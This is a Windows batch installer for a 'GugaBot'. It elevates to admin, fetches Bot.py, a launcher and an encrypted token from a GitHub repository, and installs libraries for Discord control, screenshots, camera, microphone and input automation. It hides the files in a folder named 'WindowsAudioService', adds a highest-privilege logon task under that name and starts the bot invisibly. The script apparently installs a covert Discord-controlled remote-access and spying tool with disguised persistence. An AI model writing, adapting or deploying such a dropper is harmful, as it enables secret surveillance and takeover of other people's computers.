@echo off
title GugaBot Setup
setlocal enabledelayedexpansion

:: Auto-elevate to admin
net session >nul 2>&1
if errorlevel 1 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
echo ================================
echo        GugaBot Auto Setup
echo ================================
echo.

:: --- Python Detection ---
echo [*] Searching for Python...
set "PYTHON_EXE="

for %%P in (
    "C:\Program Files (x86)\Python314-32\python.exe"
    "C:\Program Files (x86)\Python313-32\python.exe"
    "C:\Program Files (x86)\Python312-32\python.exe"
    "C:\Program Files (x86)\Python311-32\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python314\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python313\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python312\python.exe"
    "%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
    "C:\Python314\python.exe"
    "C:\Python313\python.exe"
    "C:\Python312\python.exe"
    "C:\Python311\python.exe"
) do (
    echo     Checking: %%~P
    if exist %%P (
        set "PYTHON_EXE=%%~P"
        echo [OK] Found Python at: %%~P
        goto :python_found
    )
)

:: Try py launcher, skip WindowsApps
echo     Trying py launcher...
for /f "delims=" %%i in ('py -c "import sys; print(sys.executable)" 2^>nul') do (
    echo %%i | findstr /i "WindowsApps" >nul
    if errorlevel 1 (
        set "PYTHON_EXE=%%i"
        echo [OK] Found Python via py launcher: %%i
        goto :python_found
    ) else (
        echo     Skipped WindowsApps alias: %%i
    )
)

:: Not found - install 3.11.9
echo [!] Python not found in any known location.
echo [*] Installing Python 3.11.9...
powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\python_installer.exe'"
echo     Running installer...
"%TEMP%\python_installer.exe" /quiet InstallAllUsers=0 PrependPath=1
echo     Waiting for install to finish...
timeout /t 30 >nul
set "PYTHON_EXE=%LOCALAPPDATA%\Programs\Python\Python311\python.exe"
if exist "%PYTHON_EXE%" (
    echo [OK] Python 3.11.9 installed at: %PYTHON_EXE%
) else (
    echo [ERROR] Installer ran but python.exe not found at expected path.
    echo         Trying to locate it...
    for /f "delims=" %%i in ('py -c "import sys; print(sys.executable)" 2^>nul') do (
        echo %%i | findstr /i "WindowsApps" >nul
        if errorlevel 1 (
            set "PYTHON_EXE=%%i"
            echo [OK] Found at: %%i
            goto :python_found
        )
    )
    echo [FATAL] Could not find Python after install. Aborting.
    pause
    exit /b 1
)

:python_found
echo.
echo [*] Verifying Python works...
"%PYTHON_EXE%" --version
if errorlevel 1 (
    echo [ERROR] Python found but failed to run. Something is wrong.
    pause
    exit /b 1
)
echo [OK] Python OK.

:: --- Create install folder ---
set "INSTALL_DIR=%USERPROFILE%\AppData\Roaming\WindowsAudioService"
mkdir "%INSTALL_DIR%" 2>nul
cd /d "%INSTALL_DIR%"

echo.
echo [*] Downloading Bot.py...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/Bot.py' -OutFile 'Bot.py'"
echo [OK] Bot.py downloaded.

echo.
echo [*] Downloading launcher.bat...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/launcher.bat' -OutFile 'launcher.bat'"
echo [OK] launcher.bat downloaded.

echo.
echo [*] Downloading token.enc...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/token.enc' -OutFile 'token.enc'"
echo [OK] token.enc downloaded.

echo.
echo [*] Downloading dependencies.txt...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Exly78/GugaBot/main/dependencies.txt' -OutFile 'dependencies.txt'"
echo [OK] dependencies.txt downloaded.

echo.
echo [*] Installing dependencies using: %PYTHON_EXE%
"%PYTHON_EXE%" -m pip install --upgrade pip
"%PYTHON_EXE%" -m pip install discord.py psutil pillow opencv-python pyautogui sounddevice soundfile aiohttp cryptography
echo [OK] Dependencies installed.

echo.
echo [*] Patching launcher.bat with correct Python path...
powershell -Command "(Get-Content '%INSTALL_DIR%\launcher.bat') -replace 'set \"PYTHON=.*\"', 'set \"PYTHON=%PYTHON_EXE%\"' | Set-Content '%INSTALL_DIR%\launcher.bat'"
echo [OK] launcher.bat patched.

echo.
echo [*] Adding to startup via scheduled task...
cmd /c schtasks /create /tn "WindowsAudioService" /tr "cmd.exe /c \"%INSTALL_DIR%\launcher.bat\"" /sc onlogon /rl highest /f /np
echo [OK] Added to startup.

echo.
echo ================================
echo   Setup complete! Starting bot...
echo   Python: %PYTHON_EXE%
echo ================================
echo.
echo CreateObject("WScript.Shell").Run "cmd /c ""%INSTALL_DIR%\launcher.bat""", 0, False > "%TEMP%\silent.vbs"
wscript "%TEMP%\silent.vbs"
exit
